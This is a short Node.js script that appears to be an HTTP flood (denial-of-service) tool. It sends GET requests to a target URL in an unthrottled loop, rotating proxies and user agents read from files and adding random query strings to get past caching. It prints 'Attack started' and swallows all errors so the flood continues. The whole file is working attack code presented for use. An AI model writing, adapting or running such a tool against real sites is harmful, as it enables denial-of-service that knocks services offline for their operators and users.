import request from 'request'
import fs from 'fs'
import cryptoRandomString from 'crypto-random-string';

if (process.argv.length <= 2) {
    console.log("Usage: sudo node index.js url")
}

const target = process.argv[2];

let proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
let useragents = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

function send_request(){
    let useragent = useragents[Math.floor(Math.random() * useragents.length)]
    let proxy = proxies[Math.floor(Math.random() * proxies.length)]
	request.get({
    headers: {'User-Agent': useragent},
    proxy: "http://" + proxy,
    url: target + '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})
	})
}

setInterval(() => {
	send_request();
});

console.log("Attack started")

process.on('uncaughtException', function (err) {
   
});
process.on('unhandledRejection', function (err) {
   
});